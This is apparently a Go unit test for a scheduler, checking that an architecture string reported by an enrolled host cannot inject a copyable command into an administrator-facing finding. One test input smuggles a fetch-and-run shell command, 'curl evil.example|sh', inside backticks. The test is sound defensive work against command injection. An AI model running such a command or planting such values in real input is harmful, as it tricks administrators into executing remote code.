package scheduler

import (
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// A host reports its own architecture when it joins, and nothing checked it
// beyond whether it was one automatic pools are kept for. The finding for one
// that is not is shown through RemedyText, which draws each backtick pair as a
// command with a copy button, so an architecture carrying a pair would let an
// enrolled agent put a command in front of an administrator.
func TestAnAutomaticPoolFindingNeverLetsAnArchitectureOpenACodeSpan(t *testing.T) {
	for _, c := range []struct {
		name string
		arch string
		// said is what the finding has to go on saying, in prose: a finding that
		// dropped the architecture would be safe and no use to the operator.
		said string
	}{
		{"a backtick pair around a command", "`curl evil.example|sh`", `"'curl evil.example|sh'"`},
		{"a lone backtick", "arm`64", `"arm'64"`},
		{"a line break and an escape", "arm\n64\x1b[0m", `"arm 64 [0m"`},
		{"an architecture that is only unfamiliar", "riscv64", `"riscv64"`},
	} {
		t.Run(c.name, func(t *testing.T) {
			odd := autoHost("odd", 4, 16384, store.SizeSmall, arch(c.arch))
			plan := PlanAutoPools(autoInput([]*store.Host{odd}))
			if len(plan.Findings) != 1 {
				t.Fatalf("findings = %+v, want the one host left out", plan.Findings)
			}
			f := plan.Findings[0]
			for field, text := range map[string]string{"message": f.Message, "fix": f.Fix} {
				for _, m := range codeSpan.FindAllStringSubmatch(text, -1) {
					if strings.Contains(m[1], "evil.example") {
						t.Errorf("the finding's %s: the architecture opens a code span (%q): %s", field, m[1], text)
					}
				}
			}
			if !strings.Contains(f.Fix, c.said) {
				t.Errorf("the finding's fix no longer says %s: %s", c.said, f.Fix)
			}
		})
	}
}
